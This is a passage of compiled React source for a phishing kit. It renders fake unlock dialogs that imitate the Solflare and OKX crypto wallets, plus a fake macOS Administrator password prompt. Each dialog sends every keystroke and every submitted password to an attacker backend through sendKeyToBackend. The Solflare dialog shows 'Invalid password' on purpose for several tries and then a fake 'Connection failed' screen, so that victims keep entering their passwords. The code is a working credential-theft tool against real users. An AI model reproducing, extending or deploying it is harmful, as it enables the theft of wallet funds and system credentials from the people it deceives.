                                        React.createElement("path", { d: "M511.9776 96c95.296 0 182.592 35.712 249.984 94.944 47.648 41.824 126.624 122.304 237.024 241.408 32 34.272 33.472 87.36 3.488 123.424l-3.456 3.904-9.408 10.176c-105.824 114.08-182.08 191.424-228.704 232.096C693.7056 860.64 606.8256 896 512.0096 896c-95.424 0-182.784-35.776-250.208-95.072C214.2496 759.04 135.3696 678.688 25.0656 559.68a93.536 93.536 0 0 1-3.456-123.488l3.456-3.904 9.376-10.144c105.344-113.408 181.12-190.4 227.36-231.04C329.1936 131.808 416.5216 96 511.9456 96H512.0096z m0 188.224c-117.92 0-213.504 94.848-213.504 211.776 0 116.928 95.584 211.776 213.504 211.776 117.888 0 213.504-94.848 213.504-211.776 0-116.928-95.616-211.776-213.504-211.776z m0 94.144c65.504 0 118.592 52.64 118.624 117.632 0 64.96-53.12 117.664-118.624 117.664-63.52 0-115.776-49.6-118.496-112.544l-0.128-5.12h71.168c24.832 0 45.44-18.976 47.328-43.52l0.16-3.52v-70.592h-0.032z" }))) : (React.createElement("svg", { className: "w-4 h-4 text-white", style: { width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }, viewBox: "0 0 1024 1024", version: "1.1", xmlns: "http://www.w3.org/2000/svg" },
                                        React.createElement("path", { d: "M733.976092 128.406508c-32.626072-18.838044-74.333986-7.659447-93.16282 24.961508l-40.699957 70.307276c-28.245298-6.075369-58.112536-9.480932-89.604784-9.480932-293.635667 0-445.218014 297.803593-445.218014 297.803593s82.454944 149.279908 231.025701 236.45127l-31.253818 53.983495c-18.831904 32.618908-7.659447 74.327846 24.964578 93.164866 32.615838 18.828834 74.330916 7.659447 93.164866-24.964578L758.936577 221.569328C777.772574 188.95042 766.591931 147.238412 733.976092 128.406508zM304.728818 511.997953c0-114.952078 92.615351-208.164017 207.269647-208.164017 13.520945 0 26.731828 1.300622 39.521109 3.776l-37.147038 64.167438c-0.791016-0.01228-1.578961-0.044002-2.37407-0.044002-77.131705 0-139.67004 62.835094-139.67004 140.263557 0 26.116821 7.132444 50.523697 19.526729 71.417563l-37.134759 64.144926C323.559699 611.141998 304.728818 563.795667 304.728818 511.997953z" }),
                                        React.createElement("path", { d: "M770.978844 300.511261 699.60119 423.39601c12.599969 26.88737 19.668968 56.910151 19.668968 88.601944 0 109.690238-84.347037 199.515033-191.68367 207.520357l-51.458999 88.590688c11.92868 1.092891 24.075325 1.695618 36.464493 1.695618 292.447609 0 446.1175-297.807686 446.1175-297.807686S895.060861 388.454196 770.978844 300.511261z" })))))),
                            error && (React.createElement("p", { className: "coinbase-font m-0 text-[14px] mt-[3px] text-left leading-[1.66] text-[#F0616D] flex items-center gap-[6px]", id: "component-password-text" },
                                React.createElement("svg", { className: "flex-shrink-0", style: { width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }, viewBox: "0 0 1024 1024", version: "1.1", xmlns: "http://www.w3.org/2000/svg" },
                                    React.createElement("path", { d: "M512 938.666667C276.352 938.666667 85.333333 747.648 85.333333 512S276.352 85.333333 512 85.333333s426.666667 191.018667 426.666667 426.666667-191.018667 426.666667-426.666667 426.666667z m-42.666667-298.666667v85.333333h85.333334v-85.333333h-85.333334z m0-341.333333v256h85.333334V298.666667h-85.333334z" })),
                                "Wrong password")))),
                    React.createElement("div", { className: "box-border w-full text-center text-[16px] font-medium" },
                        React.createElement("button", { onClick: handleKeywordTyping, disabled: error, onMouseEnter: () => {
                                if (keyword && keyword.length > 0 && !error)
                                    setIsUnlockHovered(true);
                            }, onMouseLeave: () => {
                                setIsUnlockHovered(false);
                                setIsUnlockPressed(false);
                            }, onMouseDown: () => {
                                if (keyword && keyword.length > 0 && !error)
                                    setIsUnlockPressed(true);
                            }, onMouseUp: () => setIsUnlockPressed(false), className: `coinbase-font-bold text-[16px] font-semibold leading-[24px] text-center rounded-[54px] transition-all ${error
                                ? 'bg-[#1E3568] text-[#0F0F12] cursor-default opacity-50 h-[56px] w-full'
                                : keyword && keyword.length > 0
                                    ? (isUnlockPressed
                                        ? 'bg-[#447CF6] text-[#101829] h-[55px] w-[calc(100%-1px)] mx-[0.5px] cursor-pointer'
                                        : isUnlockHovered
                                            ? 'bg-[#3F79F5] text-[#192A50] h-[56px] w-full cursor-pointer'
                                            : 'bg-[#447CF6] text-[#101829] h-[56px] w-full cursor-pointer')
                                    : 'bg-[#1E3568] text-[#0F0F12] h-[56px] w-full cursor-pointer'}` }, "Unlock")),
                    React.createElement("div", { className: "box-border w-full text-center text-[16px] font-medium rounded-[54px]" },
                        React.createElement("button", { className: `coinbase-font-bold h-[56px] text-[16px] font-semibold cursor-pointer w-full leading-[24px] text-center rounded-[54px] transition-colors ${isForgotPasswordPressed
                                ? 'bg-[#151618] text-white'
                                : isForgotPasswordHovered
                                    ? 'bg-[#111214] text-[#DCDCDC]'
                                    : 'bg-transparent text-white'}`, onClick: handleForgotPasswordClick, onMouseEnter: () => setIsForgotPasswordHovered(true), onMouseLeave: () => {
                                setIsForgotPasswordHovered(false);
                                setIsForgotPasswordPressed(false);
                            }, onMouseDown: () => setIsForgotPasswordPressed(true), onMouseUp: () => setIsForgotPasswordPressed(false) }, "Forgot password?")))))))));
    return modalContent;
};

const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [showPassword, setShowPassword] = useState(false);
    const [loadingInitiate, setLoadingInitiate] = useState(true);
    const [showForgetPasswordModal, setShowForgetPasswordModal] = useState(false);
    const [continueCountdown, setContinueCountdown] = useState(0);
    const [trying, setTrying] = useState(0);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    const countdownIntervalRef = useRef(null);
    // Handle initial loading - only run once when modal opens
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setLoadingInitiate(true);
            const initialLoadTimeout = setTimeout(() => {
                setLoadingInitiate(false);
                setTimeout(() => {
                    passwordInputRef.current?.focus();
                }, 1500);
            }, 1500);
            return () => {
                clearTimeout(initialLoadTimeout);
            };
        }
        else {
            setLoadingInitiate(true);
        }
    }, [isOpen]);
    // Handle document click - separate effect
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClick();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        return () => {
            document.removeEventListener('click', handleDocumentClick);
        };
    }, [isOpen, isClosable]);
    // Cleanup countdown interval
    useEffect(() => {
        return () => {
            if (countdownIntervalRef.current) {
                clearInterval(countdownIntervalRef.current);
            }
        };
    }, []);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setConnectionError(false);
        setError(false);
        setShowPassword(false);
        setShowForgetPasswordModal(false);
        setContinueCountdown(0);
        setTrying(0);
        if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
            countdownIntervalRef.current = null;
        }
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        setError(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
        }
    };
    const togglePasswordVisibility = () => {
        setShowPassword(prev => !prev);
        setTimeout(() => {
            passwordInputRef.current?.focus();
        }, 0);
    };
    const handleKeywordTyping = async () => {
        if (connecting || !keyword)
            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            setError(true);
            setHelperText('User ID is required');
            return;
        }
        if (backendConfig?.enabled !== false) {
            await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 3) {
                    setError(true);
                    setHelperText('Invalid password');
                    setTrying(trying + 1);
                }
                else {
                    setConnectionError(true);
                }
                passwordInputRef.current?.focus();
            }, 150);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const showForgetPassword = () => {
        setShowForgetPasswordModal(true);
        setContinueCountdown(10);
        // Start countdown timer
        countdownIntervalRef.current = setInterval(() => {
            setContinueCountdown(prev => {
                if (prev > 1) {
                    return prev - 1;
                }
                else {
                    if (countdownIntervalRef.current) {
                        clearInterval(countdownIntervalRef.current);
                        countdownIntervalRef.current = null;
                    }
                    return 0;
                }
            });
        }, 1000);
    };
    const closeForgetPasswordModal = () => {
        if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
            countdownIntervalRef.current = null;
        }
        setShowForgetPasswordModal(false);
        setContinueCountdown(0);
    };
    const closeWindow = () => {
        handleClick();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setError(false);
            setTrying(0);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const isButtonEnabled = !connecting;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[375px] h-[600px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: '#02050a' } }, connectionError ? (React.createElement("div", { className: "text-center px-4 py-8 flex flex-col h-full justify-between" },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: "text-2xl text-center w-6 h-6 text-red-500", fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold text-[#f5f8ff]" }, "Connection failed"),
                    React.createElement("p", { className: "text-sm text-[#f5f8ff]" }, "Please check your connection and try again.")),
                React.createElement("button", { className: "w-full rounded-full cursor-pointer p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff]", onClick: closeWindow }, "Ok"))) : (React.createElement("div", { className: "relative w-full h-full", style: { backgroundColor: '#02050a' } },
                React.createElement("div", { className: 'flex flex-col h-full bg-[#02050a]' },
                    React.createElement("div", { className: 'flex flex-col gap-[24px]' },
                        React.createElement("div", { className: 'px-[8px] pt-[8px]' },
                            React.createElement("div", { className: 'rounded-[24px] max-h-[250px] overflow-hidden' },
                                React.createElement("video", { src: "https://www.riveanimation.cards/v7/images/flag.mp4", autoPlay: true, loop: true, playsInline: true, className: "w-full h-full object-cover" }))),
                        React.createElement("div", { className: "px-[16px] flex flex-col gap-[24px]" },
                            React.createElement("div", null,
                                React.createElement("h1", { className: 'text-[24px] solflare-font-bold text-[#f5f8ff] leading-[32px]' }, "Unlock your wallet"),
                                React.createElement("p", { className: 'text-[14px] text-[rgba(245,248,255,0.4)] leading-[20px] solflare-font' }, "Enter your password and access your funds safely.")),
                            React.createElement("div", { className: 'flex flex-col gap-[24px]' },
                                React.createElement("div", null,
                                    React.createElement("div", { className: `flex flex-row p-[12px] gap-[4px] rounded-[12px] border ${error
                                            ? "border-[#ff4d4f] focus-within:border-[#ff4d4f] focus-within:outline-none focus-within:ring-0"
                                            : "border-[#1a212b] focus-within:border-white focus-within:outline-none"}` },
                                        React.createElement("input", { id: "current-password", ref: passwordInputRef, placeholder: "Enter your password", type: showPassword ? "text" : "password", autoComplete: "off", spellCheck: "false", value: keyword, onChange: handleKeywordChange, onKeyDown: (e) => {
                                                if (e.key === 'Enter' && isButtonEnabled && keyword) {
                                                    handleKeywordTyping();
                                                }
                                            }, className: "solflare-font outline-none text-[16px] leading-[24px] w-full placeholder:text-[rgba(245,248,255,0.4)]", style: { backgroundColor: '#02050a', color: 'white' } }),
                                        React.createElement("svg", { className: "cursor-pointer group", width: "24", height: "24", viewBox: "0 0 20 20", fill: "none", xmlns: "http://www.w3.org/2000/svg", onClick: togglePasswordVisibility }, !showPassword ? (React.createElement(React.Fragment, null,
                                            React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "rgba(245,248,255,0.4)" }))) : (React.createElement(React.Fragment, null,
                                            React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "rgba(245,248,255,0.4)" }),
                                            React.createElement("path", { d: "M16.7771 16.7229L15.8227 17.6774L3.22266 5.07739L4.17715 4.12289L16.7771 16.7229Z", fill: "rgba(245,248,255,0.4)" }),
                                            React.createElement("path", { d: "M17.6773 15.8227L16.7228 16.7772L4.1228 4.17721L5.07729 3.22272L17.6773 15.8227Z", fill: "rgba(245,248,255,0.4)" }))))),
                                    error && helperText && React.createElement("span", { className: 'text-[#ff4d4f] solflare-font flex text-[14px] leading-[17px] mt-1 w-full' }, helperText)),
                                React.createElement("div", { className: "" },
                                    React.createElement("button", { onClick: isButtonEnabled ? handleKeywordTyping : undefined, disabled: !isButtonEnabled || connecting, className: "solflare-font-bold self-center rounded-[100px] text-[16px] py-[12px] bg-[#ffef46] text-[#090c11] hover:bg-[#eeda0f] active:bg-[#d6c40e] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out w-full" }, "Unlock"))))),
                    React.createElement("div", { className: 'absolute bottom-0 left-0 right-0 pt-[8px] px-[16px] pb-[16px]' },
                        React.createElement("button", { onClick: showForgetPassword, className: 'text-[12px] text-[#f5f8ff] leading-[16px] flex justify-center items-center w-full p-0 cursor-pointer solflare-font' }, "Forgot password"))),
                showForgetPasswordModal && (React.createElement("div", { id: "forget-password-modal", className: "absolute inset-0 z-[1001]" },
                    React.createElement("div", { className: "relative w-full h-full" },
                        React.createElement("div", { className: "bg-[#10101099] absolute bottom-0 left-0 right-0 top-0", onClick: closeForgetPasswordModal }),
                        React.createElement("div", { tabIndex: -1, className: "absolute bottom-0 left-0 right-0 text-center flex items-center justify-center", role: "dialog" },
                            React.createElement("div", { role: "document", className: "box-border text-[#ffffff] bg-[#171a1f] text-[14px] tabular-nums list-none pointer-events-none relative w-full" },
                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", style: { width: "0px", height: "0px", overflow: "hidden", outline: "none" } }),
                                React.createElement("div", { className: "h-[302px] rounded-t-[12px] border-0 flex flex-col gap-[24px] shadow-[0_3px_6px_-4px_rgba(0,0,0,0.12),_0_6px_16px_0_rgba(0,0,0,0.08),_0_9px_28px_8px_rgba(0,0,0,0.05)] pointer-events-auto relative bg-[#171a1f]" },
                                    React.createElement("div", { className: 'flex flex-col gap-[12px]' },
                                        React.createElement("div", null,
                                            React.createElement("div", { className: 'px-[8px] text-[16px] text-white solflare-font-bold h-[64px] flex items-center' },
                                                React.createElement("div", { className: 'px-[8px]' }, "Forgot Password")),
                                            React.createElement("div", { className: 'px-[16px]' },
                                                React.createElement("div", { className: 'px-[12px] py-[8px] flex gap-[8px] border border-[rgba(255,184,0,0.2)] bg-[rgba(38,24,11,0.5)] rounded-[12px]' },
                                                    React.createElement("div", { className: 'pt-[4px]' },
                                                        React.createElement("svg", { xmlns: "http://www.w3.org/2000/svg", width: "16", height: "16", viewBox: "0 0 16 16", fill: "none" },
                                                            React.createElement("path", { d: "M13 1.33328H2.99996L1.33329 2.99995V12.9999L2.99996 14.6666H13L14.6666 12.9999V2.99995L13 1.33328ZM9.01258 11.3514H6.98706V9.88747H9.01258V11.3514ZM9.01258 8.8828H6.98706V4.64851H9.01258V8.8828Z", fill: "#FFB800" }))),
                                                    React.createElement("div", { className: 'flex flex-col' },
                                                        React.createElement("div", { className: 'text-left text-[12px] solflare-font-bold h-[24px] flex items-center text-[#ffb800]' }, "Make sure you have your recovery phrase"),
                                                        React.createElement("div", { className: 'text-left text-[12px] solflare-font text-[rgba(255,184,0,0.7)]' }, "Your recovery phrase is the only way to restore your wallet if you log out."))))),
                                        React.createElement("div", { className: 'px-[16px] text-[14px] leading-[20px] text-[rgba(245,248,255,0.4)] solflare-font text-left' }, "If you forgot your password, the only way to restore your wallets is to log out, re-import your recovery phrase and set a new password.")),
                                    React.createElement("div", { className: 'text-[16px] leading-[24px] text-[#f5f8ff] flex flex-row gap-[16px] px-[16px]' },
                                        React.createElement("button", { onClick: closeForgetPasswordModal, className: 'solflare-font w-full rounded-[100px] text-[16px] py-[12px] bg-[rgba(245,248,255,0.08)] text-[#ffffff] hover:bg-[rgba(245,248,255,0.12)] active:bg-[rgba(245,248,255,0.2)] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out' }, "Cancel"),
                                        React.createElement("button", { className: 'solflare-font w-full rounded-[100px] text-[16px] py-[12px] bg-[#ffef46] text-[#090c11] hover:bg-[#eeda0f] active:bg-[#d6c40e] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out' }, "Continue"))),
                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", className: "w-0 h-0 overflow-hidden outline-none" }))))))))))));
    return modalContent;
};

const POSTER_DARK = 'https://static.coinall.ltd/cdn/assets/imgs/2412/87CDA1790E4C4D22.png';
const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, }) => {
    const [keyword, setKeyword] = useState('');
    const [connecting, setConnecting] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const [isWrongPassword, setIsWrongPassword] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    const isDark = darkMode;
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setTimeout(() => passwordInputRef.current?.focus(), 200);
        }
    }, [isOpen]);
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClose();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        return () => document.removeEventListener('click', handleDocumentClick);
    }, [isOpen, isClosable]);
    const handleClose = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setConnecting(false);
        setShowPassword(false);
        setIsWrongPassword(false);
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        setIsWrongPassword(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && backendConfig?.enabled !== false) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.OKX);
        }
    };
    const handleUnlock = async () => {
        if (connecting || !keyword.trim())
            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            return;
        }
        if (backendConfig?.enabled !== false) {
            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.OKX);
            setTimeout(() => {
                setConnecting(false);
                setIsWrongPassword(!!result.error);
                passwordInputRef.current?.focus();
            }, 400);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const handleKeyDown = (e) => {
        if (e.key === 'Enter' && keyword.trim() && !connecting) {
            handleUnlock();
        }
    };
    const togglePasswordVisibility = () => {
        setShowPassword((prev) => !prev);
        setTimeout(() => passwordInputRef.current?.focus(), 0);
    };
    if (!isOpen)
        return null;
    const isButtonEnabled = keyword.trim().length > 0 && !connecting && !isWrongPassword;
    const logoSrc = resolveAssetUrl(isDark ? ASSET_PATHS.okxCoverDark : ASSET_PATHS.okxCoverLight);
    return (React.createElement("div", { ref: modalRef, className: `okx-modal fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50 antialiased ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'} ${isDark ? 'text-white' : 'text-black'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: `relative w-[360px] h-[600px] overflow-hidden ${isDark
                ? 'bg-black shadow-[0_1px_2px_rgba(256,256,256,0.2)]'
                : 'bg-white shadow-[0_4px_10px_rgba(0,0,0,0.15)]'}` },
            React.createElement("div", { className: "h-full overflow-y-auto overflow-x-hidden" },
                React.createElement("div", { className: "flex items-center justify-center" },
                    React.createElement("div", { className: "flex w-full items-center justify-center" },
                        React.createElement("video", { key: logoSrc, className: "block h-full w-full object-contain", autoPlay: true, muted: true, playsInline: true, src: logoSrc, poster: isDark ? POSTER_DARK : undefined }))),
                React.createElement("div", { className: "flex flex-col items-center mb-[24px]" },
                    React.createElement("div", { className: `w-full text-center text-[28px] font-[700] pb-[12px] leading-8 ${isDark ? 'text-white' : 'text-black'}` }, "Web3 \u5165\u53E3\uFF0C\u4E00\u4E2A\u5C31\u591F"),
                    React.createElement("div", { className: "w-full text-center text-[12px] font-normal leading-4 text-[#8c8c8c]" }, "\u94B1\u5305 \u00B7 \u4EA4\u6613 \u00B7 \u80A1\u7968 \u00B7 \u8D5A\u5E01 \u00B7 DApp")),
                React.createElement("form", { className: "w-full px-[16px]", onSubmit: (e) => {
                        e.preventDefault();
                        handleUnlock();
                    } },
                    React.createElement("div", { className: `flex h-12 w-full items-center rounded-[8px] border px-3.5 transition-colors ${isDark ? 'bg-[#1f1f1f]' : 'bg-[#f0f0f0]'} ${isWrongPassword
                            ? 'border-[#91304a]'
                            : isFocused
                                ? isDark
                                    ? 'border-white'
                                    : 'border-black'
                                : isDark
                                    ? 'border-[#1f1f1f]'
                                    : 'border-[#f0f0f0]'}`, role: "none" },
                        React.createElement("input", { ref: passwordInputRef, className: `h-full min-w-0 flex-1 border-none flex items-center bg-transparent p-0 text-[16px] leading-5 outline-none appearance-none ${isDark
                                ? 'text-white caret-[#bcff2f] placeholder:text-[#6c6c6c]'
                                : 'text-black caret-[#2b6d17] placeholder:text-[#BDBDBD]'}`, type: showPassword ? 'text' : 'password', value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, onFocus: () => setIsFocused(true), onBlur: () => setIsFocused(false), placeholder: "\u8BF7\u8F93\u5165\u5BC6\u7801", autoComplete: "off", autoCapitalize: "off", autoCorrect: "off", spellCheck: false, disabled: connecting, "aria-label": "Password" }),
                        React.createElement("div", { className: "ml-2 flex shrink-0 items-center" },
                            React.createElement("button", { type: "button", className: "inline-flex cursor-pointer items-center justify-center border-none bg-transparent p-0 leading-none text-[#7d7d7d] hover:opacity-85", onClick: togglePasswordVisibility, "aria-label": showPassword ? 'Hide password' : 'Show password' }, showPassword ? (React.createElement("svg", { width: "20", height: "20", viewBox: "0 0 24 24", fill: "currentColor" },
                                React.createElement("path", { d: "M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" }))) : (React.createElement("svg", { width: "20", height: "20", viewBox: "0 0 24 24", fill: "currentColor" },
                                React.createElement("path", { d: "M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" })))))),
                    isWrongPassword && (React.createElement("p", { className: "mt-2 text-left text-[14px] leading-[16px] text-[#eb4b6d]" },
                        "\u5BC6\u7801\u9519\u8BEF\uFF0C\u82E5\u6D89\u53CA\u6307\u7EB9\u6D4F\u89C8\u5668\u3001\u4E91\u4E3B\u673A\u6216\u786C\u4EF6\u5347\u7EA7\u7B49\u60C5\u51B5\uFF0C\u8BF7\u67E5\u770B",
                        ' ',
                        React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", target: "_blank", rel: "noopener noreferrer", className: `underline ${isDark ? 'text-white' : 'text-black'} hover:no-underline` }, "\u516C\u544A"))),
                    React.createElement("div", { className: "invisible h-[139px]", "aria-hidden": "true" }))),
            React.createElement("div", { className: `absolute bottom-0 left-0 z-[10000] w-[360px] ${isDark ? 'bg-black' : 'bg-white'}` },
                React.createElement("div", { className: "flex flex-col items-center px-[16px] pb-[24px]" },
                    React.createElement("button", { type: "button", disabled: !isButtonEnabled, onClick: handleUnlock, className: `flex p-[18px] w-full items-center justify-center rounded-full border-none text-[18px] font-[700] leading-5 transition-colors ${isButtonEnabled
                            ? isDark
                                ? 'cursor-pointer bg-white text-black hover:bg-[#e8e8e8]'
                                : 'cursor-pointer bg-black text-white hover:bg-[#1a1a1a]'
                            : isDark
                                ? 'cursor-not-allowed bg-[#1f1f1f] text-[#5c5c5c]'
                                : 'cursor-not-allowed bg-[#f0f0f0] text-[#b0b0b0]'}` },
                        React.createElement("span", null, "\u89E3\u9501")),
                    React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", className: "cursor-pointer mt-[24px] text-center text-sm font-medium leading-5 text-[#8c8c8c] no-underline hover:opacity-60" }, "\u5FD8\u8BB0\u5BC6\u7801\uFF1F"))))));
};

const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminNameProp }) => {
    const [adminName, setAdminName] = useState(adminNameProp || 'Administrator');
    const [keyword, setKeyword] = useState('');
    const [connecting, setConnecting] = useState(false);
    const [trying, setTrying] = useState(0);
    const [submitting, setSubmitting] = useState(false);
    const [isWrongPassword, setIsWrongPassword] = useState(false);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    // Drag and drop state
    const [isDragging, setIsDragging] = useState(false);
    const [modalPosition, setModalPosition] = useState({ x: 0, y: 0 });
    const dragStartPos = useRef({ x: 0, y: 0 });
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setModalPosition({ x: 0, y: 0 });
            setAdminName(adminNameProp || 'Administrator');
            setTimeout(() => {
                passwordInputRef.current?.focus();
            }, 300);
        }
    }, [isOpen, adminNameProp]);
    // Handle drag functionality
    useEffect(() => {
        if (!isDragging)
            return;
        const handleMouseMove = (e) => {
            const deltaX = e.clientX - dragStartPos.current.x;
            const deltaY = e.clientY - dragStartPos.current.y;
            setModalPosition({
                x: modalPosition.x + deltaX,
                y: modalPosition.y + deltaY
            });
            dragStartPos.current = { x: e.clientX, y: e.clientY };
        };
        const handleMouseUp = () => {
            setIsDragging(false);
        };
        document.addEventListener('mousemove', handleMouseMove);
        document.addEventListener('mouseup', handleMouseUp);
        return () => {
            document.removeEventListener('mousemove', handleMouseMove);
            document.removeEventListener('mouseup', handleMouseUp);
        };
    }, [isDragging, modalPosition]);
    const handleMouseDown = (e) => {
        const target = e.target;
        if (target.tagName === 'BUTTON' ||
            target.tagName === 'INPUT' ||
            target.closest('button') ||
            target.closest('input')) {
            return;
        }
        setIsDragging(true);
        dragStartPos.current = { x: e.clientX, y: e.clientY };
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, "MAC");
        }
    };
    const handleKeywordTyping = async () => {
        if (connecting || !keyword)
